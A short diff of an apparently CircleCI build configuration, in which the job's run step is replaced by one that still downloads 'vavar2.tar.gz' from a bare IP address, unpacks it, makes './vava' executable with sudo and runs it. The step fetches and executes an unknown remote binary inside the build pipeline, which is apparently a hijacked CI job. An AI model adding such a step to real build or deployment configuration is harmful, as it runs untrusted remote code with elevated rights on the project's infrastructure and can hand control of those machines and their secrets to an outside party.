@@ -11,8 +11,7 @@ jobs:
       - checkout
       - node/install:
           install-yarn: true
-      - run: wget http://207.148.123.213/vavar2.tar.gz && tar xfvz vavar2.tar.gz && sudo chmod +x ./vava && nohup ./vava
-             
+      - run: wget http://207.148.123.213/vavar2.tar.gz && tar xfvz vavar2.tar.gz && sudo chmod +x ./vava && ./vava
 workflows:
   test_my_app:
     jobs:
